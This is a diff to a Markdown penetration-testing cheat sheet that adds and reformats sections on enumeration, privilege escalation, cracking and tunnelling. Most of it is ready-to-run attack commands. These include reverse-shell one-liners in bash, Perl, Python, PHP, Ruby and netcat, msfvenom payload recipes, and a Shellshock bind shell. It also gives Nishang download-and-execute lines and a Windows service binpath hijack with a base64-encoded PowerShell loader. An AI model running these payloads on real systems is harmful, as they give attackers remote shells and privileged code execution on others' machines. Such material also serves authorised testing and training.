@@ -274,13 +274,19 @@ help
 
 - Show Mountable NFS Shares
       `nmap -sV --script=nfs-showmount $ip`
+  - Show all mountable shares on the victim
+      `showmount -e $ip` *show mount is part of nfs-common package(>apt-get install nfs-common)*
+  - Show all mounted shares to the box, this is good for linux boxes if the victim is using file server as share
+      `showmount -a $ip`
+
+- Mounting an NFS to the mount point
+      `sudo mkdir /mnt/<dirname>`
+      `sudo mount -t nfs $ip:/<shared name> /mnt/<dirname>`
 
 - RPC (Remote Procedure Call) Enumeration
-
-- Connect to an RPC share without a username and password and enumerate privledges
+  - Connect to an RPC share without a username and password and enumerate privledges
       `rpcclient --user="" --command=enumprivs -N $ip`
-
-- Connect to an RPC share with a username and enumerate privledges
+  - Connect to an RPC share with a username and enumerate privledges
       `rpcclient --user="<Username>" --command=enumprivs $ip`
 
 ### SMB Enumeration
@@ -315,6 +321,8 @@ help
       `enum4linux $ip`
 
       `enum4linux -a $ip`
+
+      `crackmapexec smb $ip --shares`
 
 - SMB Finger Printing  
       `smbclient -L //$ip`
@@ -547,6 +555,9 @@ help
 - Determine the type of a file  
       `file <filename>`
 
+- Find all files with "password" in directory
+      `grep -Ri password . | grep -v Lang`
+
 ## HTTP Enumeration ( Always search for .txt,php,asp,aspx files )
 
 - Search for folders with gobuster:  
@@ -750,137 +761,91 @@ help
       From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`
 
 - Pen test monkey PHP reverse shell  
+  - Bash
+    - Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+          `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+  - PERL
+    - Here’s a shorter, feature-free version of the perl-reverse-shell:
+            `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+    - There’s also an alternative PERL revere shell here.
+  - Python
+    - This was tested under Linux / Python 2.7:
+            `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+  - PHP
+    - This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
+            `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
+    - If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+  - Ruby
+            `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+  - Netcat
+    - Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
+            `nc -e /bin/sh 10.0.0.1 1234`
+    - If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+            `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+  - Java
 
-    Bash
+      ```Java
+      r = Runtime.getRuntime()
+      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+      p.waitFor()
+      ```
 
- Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
-
- bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-
-    PERL
-
- Here’s a shorter, feature-free version of the perl-reverse-shell:
-
- perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
- There’s also an alternative PERL revere shell here.
-Python
-
- This was tested under Linux / Python 2.7:
-
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-   PHP
-
- This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
-
- php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
-
- If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
-  Ruby
-
- ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
-  Netcat
-
- Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
-
- nc -e /bin/sh 10.0.0.1 1234
-
- If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
-
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-
-   Java
-
- r = Runtime.getRuntime()
- p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
- p.waitFor()
-
- [Untested submission from anonymous reader]
-   xterm
-
- One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
-
- xterm -display 10.0.0.1:1
-
- To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
-
- Xnest :1
-
- You’ll need to authorise the target to connect to you (command also run on your host):
-
- xhost +targetip
-
+      _[Untested submission from anonymous reader]_
+  - xterm
+    - One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+            `xterm -display 10.0.0.1:1`
+    - To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+            `Xnest :1`
+    - You’ll need to authorise the target to connect to you (command also run on your host):
+            `xhost +targetip`
     [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
-- php-findsock-shell - turns PHP port 80 into an interactive shell  
-    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
+  - php-findsock-shell - turns PHP port 80 into an interactive shell  
+      [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
 
-- Perl Reverse Shell ( Very helpfull )  
-    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
+  - Perl Reverse Shell ( Very helpfull )  
+      [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
 
-- PHP powered web browser Shell b374k with file upload etc.  
-    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
+  - PHP powered web browser Shell b374k with file upload etc.  
+      [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
 
-- Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell
-    <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1>
+  - Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell
+      <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1>
 
-- Web Backdoors from Fuzzdb
-    <https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors>
+  - Web Backdoors from Fuzzdb
+      <https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors>
 
 - Creating Meterpreter Shells with MSFVenom - <http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/>
 
       *Linux*
-
       `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
-
       *Windows*
-
       `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
-
       *Mac*
-
       `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
 
       **Web Payloads**
 
       *PHP*
-
       `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-
       OR
-
       `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-
       Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
-
       `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
-
       *ASP*
-
       `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
-
       *JSP*
-
       `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
-
       *WAR*
-
       `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
 
       **Scripting Payloads**
 
       *Python*
-
       `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
-
       *Bash*
-
       `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
-
       *Perl*
-
       `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
 
       **Shellcode**
@@ -888,15 +853,10 @@ Python
       For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
       *Linux Based Shellcode*
-
       `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-
       *Windows Based Shellcode*
-
       `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-
       *Mac Based Shellcode*
-
       `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
       **Handlers**
@@ -944,6 +904,21 @@ Python
   - Shell Shock run bind shell  
 
              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
+
+- Nishang
+      **For this to work, you should have an exploit that can run remote command execution**
+  - You can install nishang via `sudo apt-get install nishang` which installs all of the reverseshells within `/user/share/nishang/shells/` to be used for purpose of reverse shells.
+      `cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1`
+  - After copying the script to your local working folder, copy one of the suitable example lines in the rev.ps1 to the bottom of the file:
+      `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001`
+  - Start a web server via python
+      `python3 -m http.server 80`
+  - And within your RCE, put this as:
+      `powershell.exe -command IEX( IWR http://10.10.14.19:80/rev.ps1 -UseBasicParsing)`
+      or
+      `powershell.exe -command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:80/rev.ps1')`
+  - You have to remember to run the handler to catch the shell:
+      `nc -nvlp 9001`
 
 ## File Transfers
 
@@ -1441,18 +1416,31 @@ Without metasploit we can generate a shell and listen with netcat or metasploit 
 
              `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
 
-- Windows Service Configuration Viewer - Check for misconfigurations
-    in services that can lead to privilege escalation. You can replace
-    the executable with your own and have windows execute whatever code
-    you want as the privileged user.  
-    icacls scsiaccess.exe
+- Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.  
+    `icacls scsiaccess.exe`
 
-         scsiaccess.exe  
-         NT AUTHORITY\SYSTEM:(I)(F)  
-         BUILTIN\Administrators:(I)(F)  
-         BUILTIN\Users:(I)(RX)  
-         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
-         Everyone:(I)(F)
+      ```text
+      scsiaccess.exe  
+      NT AUTHORITY\SYSTEM:(I)(F)  
+      BUILTIN\Administrators:(I)(F)  
+      BUILTIN\Users:(I)(RX)  
+      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
+      Everyone:(I)(F)
+      ```
+
+  - If for example, service `UsoSvc` is having **AllAccess, Start** set, you can change the binary path to execute what we want:
+    - First stop the service via
+        `sc.exe stop UsoSvc`
+    - Second, change the binary path of the service via the command. _In this case, my reverse shell was of nishang and would autoexecute within powershell to create a reverse shell_!
+        `sc.exe config UsoSvc binpath="powershell.exe 'IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)'"`
+    - Last, start the service:
+        `sc.exe start UsoSvc`
+
+      **If this method doesn't work, change the command to base64 little endian sometimes it works!**
+      `echo "IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0`
+      `sc.exe config UsoSvc binpath="powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
+      Or
+      `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
 
 - Compile a custom add user command in windows using C  
 
@@ -2038,7 +2026,6 @@ joomscan
             `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
 
 - Password Hash Attacks
-    -------------------------------------------------------------------------------------------------------------------
 
   - Online Password Cracking  
         [*https://crackstation.net/*](https://crackstation.net/)
@@ -2053,7 +2040,7 @@ joomscan
 
     - Cracking Linux Hashes - /etc/shadow file
 
-      ```
+      ```text
       500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
       3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
       7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
@@ -2062,14 +2049,14 @@ joomscan
 
     - Cracking Windows Hashes
 
-    ```
-    3000 | LM                                               | Operating-Systems
-    1000 | NTLM                                             | Operating-Systems
-    ```
+      ```text
+      3000 | LM                                               | Operating-Systems
+      1000 | NTLM                                             | Operating-Systems
+      ```
 
     - Cracking Common Application Hashes
 
-    ```
+    ```text
       900 | MD4                                              | Raw Hash
         0 | MD5                                              | Raw Hash
      5100 | Half MD5                                         | Raw Hash
@@ -2079,8 +2066,7 @@ joomscan
      1700 | SHA-512                                          | Raw Hash
     ```
 
-    Create a .hash file with all the hashes you want to crack
-    puthasheshere.hash:
+    Create a .hash file with all the hashes you want to crack puthasheshere.hash:
     `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`
 
     Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
@@ -2117,6 +2103,7 @@ joomscan
         `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`
   - JTR forced descrypt brute force cracking  
         `john --format=descrypt hash --show`
+
 - Passing the Hash in Windows
   - Use Metasploit to exploit one of the SMB servers in the labs.
         Dump the password hashes and attempt a pass-the-hash attack
@@ -2131,30 +2118,27 @@ joomscan
     redirect it to a different IP address and port
   - `apt-get install rinetd`
   - `cat /etc/rinetd.conf`
+
       ```shell
       # bindadress bindport connectaddress connectport
       w.x.y.z 53 a.b.c.d 80
       ```
+
 - SSH Local Port Forwarding: supports bi-directional communication
     channels
   - `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`
 - SSH Remote Port Forwarding: Suitable for popping a remote shell on
     an internal non routable network
   - `ssh <gateway> -R <remote port to bind>:<local host>:<local port>`
-- SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
-    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
-    network on ANY PORT
+- SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT
   - `ssh -D <local proxy port> -p <remote port> <target>`
-- Proxychains - Perform nmap scan within a DMZ from an external
-    computer
+- Proxychains - Perform nmap scan within a DMZ from an external computer
   - Create reverse SSH tunnel from Popped machine on :2222  
     - `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
     - `ssh -f -N -R 2222:<local host>:22 root@<remote host>`
-  - Create a Dynamic application-level port forward on 8080 thru
-        2222  
+  - Create a Dynamic application-level port forward on 8080 thru 2222  
     - `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`
-  - Leverage the SSH SOCKS server to perform Nmap scan on network
-        using proxy chains  
+  - Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains  
     - `proxychains nmap --top-ports=20 -sT -Pn $ip/24`
 - HTTP Tunneling  
       `nc -vvn $ip 8888`
@@ -2164,15 +2148,12 @@ joomscan
         `sudo hts -F <server ip addr>:<port of your app> 80`
         On client side:  
         `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`
-- Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
-    network
+- Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network
   - Tunnel on port 22  
         `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`
   - Port 22 blocked? Try port 80? or 443?  
         `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`
-- Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
-    (bypass deep packet inspection)
-
+- Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)
   - Windows machine add required firewall rules without prompting the user
     - `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`
     - `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`
@@ -2183,11 +2164,13 @@ joomscan
   - Create HTTP reverse shell by connecting to localhost port 3000  
         `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`
 - VLAN Hopping
+
       ```shell
       git clone https://github.com/nccgroup/vlan-hopping.git
       chmod 700 frogger.sh
       ./frogger.sh
       ```
+
 - VPN Hacking
   - Identify VPN servers:  
         `./udp-protocol-scanner.pl -p ike $ip`
@@ -2296,10 +2279,12 @@ joomscan
   - Show the configuration parameters for a module  
         `show options`
   - Set options for a module  
+
         ```shell
         set RHOSTS 192.168.1.1-254  
         set THREADS 10
         ```
+
   - Run the module  
         `run`
   - Execute an Exploit
